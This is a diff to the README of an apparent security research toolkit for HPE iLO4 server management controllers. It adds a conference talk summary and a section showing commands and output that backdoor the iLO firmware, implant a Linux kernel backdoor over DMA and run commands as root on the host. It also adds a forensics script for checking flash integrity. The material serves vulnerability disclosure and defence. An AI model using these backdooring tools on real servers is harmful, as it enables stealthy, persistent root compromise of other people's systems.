@@ -16,6 +16,10 @@ the family of servers ``HP ProLiant Gen8`` and ``ProLiant Gen9`` servers) and
 the results of this study were presented at the **REcon** conference held in
 Brussels (February 2 - 4, 2018, see [1]_).
 
+A follow-up of our study was presented at the **SSTIC** conference, held in
+France (Rennes, June 13 - 15, 2018, see [8]_). We focused this talk on
+firmware backdooring and achieving long-term persistence.
+
 ``iLO4`` runs on a dedicated ``ARM`` processor embedded in the server,
 and is totally independent from the main processor. It has a dedicated flash
 chip to hold its firmware, a dedicated RAM chip and a dedicated network
@@ -35,6 +39,9 @@ February 2017, known as ``CVE-2017-12542`` (``CVSSv3`` 9.8 [3]_) :
 
 Slides and demos
 ----------------
+
+REcon Brussels 2018
+*******************
 
 The slides from our **REcon** talk are available here_ . They cover the
 following points:
@@ -79,6 +86,25 @@ payload in the host Linux kernel.
     :width: 100%
     :align: center
 
+
+SSTIC 2018
+**********
+
+The slides from our **SSTIC** talk are available at this location_ (more
+details can be found in the paper_). After a brief recap of our **REcon**
+talk, we propose the following new materials:
+
+* Firmware security and boot chain analysis
+* Backdoor architecture
+
+To illustrate these works, we release a new demo as video. It demonstrates
+the use of the vulnerability we discovered in the web server to flash a new
+backdoored firmware. Then we demonstrate the use of the DMA communication
+channel to execute arbitrary commands on the host system.
+
+.. image:: https://github.com/airbus-seclab/ilo4_toolbox/blob/master/demos/demo4_backdoor.gif
+    :width: 100%
+    :align: center
 
 
 
@@ -162,6 +188,57 @@ Using ``IDA Pro`` to load the extracted file ``ilo1.bin`` at ``0x20001000`` as
 can be used to extract the ``Integrity`` applicative image.
 
 
+Firmware backdooring
+********************
+
+The ``insert_backdoor.sh`` script can be run on a legitimate firmware file to
+add a backdoor in the webserver module. The backdoor can then be used using
+the ``backdoor_client.py`` script.
+
+::
+
+    >./insert_backdoor.sh ilo4_250.bin
+    [...]
+    [+] Firmware ready to be flashed
+
+    >python backdoor_client.py 192.168.42.78
+    [+] iLO Backdoor found
+    [-] Linux Backdoor not detected
+    [...]
+    >>> ib.install_linux_backdoor()
+    [*] Dumping kernel...
+    [+] Dumped 1000000 bytes!
+    [+] Found syscall table @0xffffffff81a001c0
+    [+] Found sys_read @0xffffffff8121e510
+    [+] Found call_usermodehelper @0xffffffff81098520
+    [+] Found serial8250_do_pm @0xffffffff81528760
+    [+] Found kthread_create_on_node @0xffffffff810a2000
+    [+] Found wake_up_process @0xffffffff810ad860
+    [+] Found __kmalloc @0xffffffff811f8c50
+    [+] Found slow_virt_to_phys @0xffffffff8106c6a0
+    [+] Found msleep @0xffffffff810f0050
+    [+] Found strcat @0xffffffff8140c9c0
+    [+] Found kernel_read_file_from_path @0xffffffff812236e0
+    [+] Found vfree @0xffffffff811d7f90
+    [+] Shellcode written
+    [+] iLO Backdoor found
+    [+] Linux Backdoor found
+    >>> ib.cmd("/usr/bin/id")
+    [+] Found shared memory page! 0xeab00000 / 0xffff8800eab00000
+    uid=0(root) gid=0(root) groups=0(root)
+
+
+Forensics
+*********
+
+The ``exploit_check_flash.py`` script can be run against an instance of ``HP
+iLO4`` vulnerable to ``CVE-2017-12542``. Its purpose it to dump the content of
+the flash and then compare its digest with a known "good" value.
+
+::
+
+    >python exploit_check_flash.py 192.168.42.78 250
+
 
 Network
 *******
@@ -232,6 +309,8 @@ References
 .. [4] http://h20565.www2.hpe.com/hpsc/doc/public/display?docId=hpesbhf03769en_us
 .. [5] https://github.com/jjyg/metasm
 .. [6] https://github.com/dmendel/bindata
+.. [8] https://www.sstic.org/2018/presentation/subverting_your_server_through_its_bmc_the_hpe_ilo4_case/
 .. [GPLv2] https://github.com/airbus-seclab/ilo4_toolbox/blob/master/COPYING
 .. _here: https://github.com/airbus-seclab/airbus-seclab.github.io/blob/master/ilo/RECONBRX2018-Slides-Subverting_your_server_through_its_BMC_the_HPE_iLO4_case-perigaud-gazet-czarny.pdf
-
+.. _location: https://github.com/airbus-seclab/airbus-seclab.github.io/blob/master/ilo/SSTIC2018-Slides-EN-Backdooring_your_server_through_its_BMC_the_HPE_iLO4_case-perigaud-gazet-czarny.pdf
+.. _paper: https://airbus-seclab.github.io/ilo/SSTIC2018-Article-subverting_your_server_through_its_bmc_the_hpe_ilo4_case-gazet_perigaud_czarny.pdf
